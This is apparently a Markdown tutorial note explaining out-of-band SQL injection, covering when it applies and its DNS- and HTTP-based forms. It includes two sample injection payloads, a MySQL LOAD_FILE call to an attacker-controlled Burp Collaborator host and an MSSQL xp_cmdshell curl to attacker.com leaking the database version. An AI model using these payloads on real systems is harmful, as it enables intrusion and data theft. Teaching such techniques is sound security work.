# Out-of-Band (OOB) SQL Injection:
### What's OOB SQLi:
In this type of injection, attacker uses indirect interaction (out-of-band) instead of direct interaction (in-band) with the web application. The database is triggered to communicate with an external attacker-controlled server using DNS/HTTP channels. 

### When is OOB Used:
When:
- target database can make outbound requests.
- no blind SQLi possible directly
- application's responses are not observable

### How OOB SQLi Works:
<p align="center">
<img width="60%" src="./Pasted image 20260201201938.png">
</p>

# Types of OOB SQLi:
Typically, two types of OOB SQLi are demonstrated:
- DNS-Based
- HTTP-Based
### Working of DNS-Based OOB SQLi:
Let's take an example. A website has a vulnerable `id` parameter in URL:
`http://localhost:1337/data.js?id=1`
Now, in order to perform SQLi using out-of-band interaction, the attacker may follow the following steps:
- Attacker sets up a dns server (dnslog.cn, burp collaborator, etc.)
- Attacker then injects a payload like
  `' union select LOAD_FILE('\\\\attacker.burpcollaborator.net\\file')--`
    where:
    1. `LOAD_FILE`-> Reads a file (specific for MySQL). In this case, to read `file` it will resolve the domain first, resulting in dns log.
    2. `\\attacker.burpcollaborator.net\\file`->dummy file name with legitimate domain set by attacker.
- Database tries to access the domain and the dns log is saved at the attacker-controlled server.
- The attacker monitors the server and confirms the vulnerability when the dns log shows up.
 
### Working of HTTP-Based OOB SQLi:
A website has a vulnerable `search` parameter in its POST request:
```
POST /search Content-Type: application/x-www-form-urlencoded 
search=keyword
```
The attacker:
- sets up an http server (dnslog.cn, burp collaborator, etc.)
- then injects a payload like
  `'; EXEC xp_cmdshell 'curl http://attacker.com?data=(SELECT@@version)' --`
    where:
    1. payload uses the `xp_cmdshell` function (MSSQL) to send a request to the attacker's server, including database version information in the query string.
    2. Database tries to access the domain and the http history is saved at the attacker-controlled server.
- monitors the server and confirms the vulnerability when the http request shows up.

This explanation will help understanding behind the scenes of an injection attack via out of band interaction.
For a realistic approach, refer to the case study of OOB SQLi. Hope it helps!
